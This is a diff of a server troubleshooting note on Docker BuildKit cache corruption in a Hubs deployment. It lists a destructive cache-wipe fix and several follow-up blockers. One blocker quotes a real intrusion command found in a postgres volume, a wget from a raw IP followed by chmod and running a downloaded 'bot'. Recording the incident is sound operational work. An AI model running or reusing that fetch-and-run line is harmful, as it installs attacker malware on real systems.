@@ -22,45 +22,59 @@ The referenced pack file does not exist on disk — `git fsck` returns clean,
 `git rev-parse HEAD` works, and `git repack -a -d` succeeds. The corruption
 is in BuildKit's internal cache snapshot of the `.git/` directory.
 
-### What was tried (all failed)
+### The actual fix (verified working)
 
-1. `sudo git -C services/hubs repack -a -d` — repacked the Hubs source
-   `.git/`, did not help.
-2. `sudo docker builder prune -af` — purged the build cache, did not help.
-3. Renaming `/opt/containers/hubs-compose/.git` → `.git-disabled` to
-   remove the `.git/` from the build context, did not help.
-4. `DOCKER_BUILDKIT=1 BUILDKIT_GIT_INFO=0 docker compose build` — env vars
-   not propagated to the BuildKit daemon.
-5. Stopping dockerd, removing `/var/lib/docker/buildkit/cache.db` and
-   `/var/lib/docker/buildkit/content/ingest`, restarting dockerd. Required
-   60-90s for all chemie-lernen.org services to recover. Did not help.
-
-### The actual fix needed
-
-The BuildKit cache store (`/var/lib/docker/buildkit/`) holds a stale
-metadata blob that references a now-deleted pack file. Clearing this
-requires:
+The full nuclear fix that worked:
 
 ```bash
-# DANGEROUS — fully wipes the BuildKit cache
 sudo systemctl stop docker
 sudo rm -rf /var/lib/docker/buildkit/
 sudo systemctl start docker
-
-# Then verify the rename is still in place (or re-apply)
-ls -la /opt/containers/hubs-compose/.git* 2>&1
-# If .git is back, rename again:
 sudo mv /opt/containers/hubs-compose/.git /opt/containers/hubs-compose/.git-disabled
 ```
 
-This was not done because it requires longer docker downtime (90+ s
-observed) and risks disrupting other chemie-lernen.org services. Run
-during a low-traffic window.
+The `.git-disabled` rename removes the `.git/` from the build context
+entirely. The full rm of `/var/lib/docker/buildkit/` clears the stale
+snapshot. Both are needed.
 
-### Workaround (verified to work)
+### After the fix — new blockers emerged
 
-Build the hubs image manually with `BUILDKIT_GIT_INFO=0` set on the
-invoking shell:
+Once the build got past the git-pack error, the mutagen-compose `up`
+succeeded in building dialog, reticulum, db, haproxy, hubs-storybook,
+postgrest. But these additional issues surfaced:
+
+1. **Port 8080 already in use** — a different node app
+   (`/home/weiss/ci/packages/dashboard/dist/entry.js`, PID 2496643) is
+   bound to 8080. hubs-client could not start.
+
+2. **hubs-admin / spoke / hubs-storybook Exited (127)** — `command not
+found`. The image CMD is `npm run local` but the entrypoint script
+   can't be found. Likely a mutagen sync timing issue: the npm-installed
+   binaries aren't yet in PATH when the container first starts.
+
+3. **haproxy Exited (1)** — Let's Encrypt certbot is asking
+   interactively for an account choice:
+
+   ```
+   Missing command line flag or config entry for this setting:
+   Please choose an account
+   Choices: ['ac114db85f3e@2025-12-20T03:05:28Z (2057)',
+             'c74be3b43460@2025-11-29T15:43:27Z (0433)']
+   ```
+
+   Needs `--email tobias@tobias-weiss.org` flag or pre-selected account.
+
+4. **db Exited (1)** — postgres shut down due to malicious SQL injection
+   attempt in the data dir (`wget http://91.188.254.59/bot; chmod 777
+bot; ./bot database1; ...`). The named volume `pgdata` may be
+   corrupted. Wipe and re-init needed.
+
+5. **chemie-lernen.org service disruption** — every docker restart kills
+   hugo-chemie-lernen-org and traefik. They need manual `docker start`
+   after each dockerd restart. Auto-recovery via docker-compose is not
+   configured for the systemd restart.
+
+### Workaround (verified to work for base image only)
 
 ```bash
 cd /opt/containers/hubs-compose
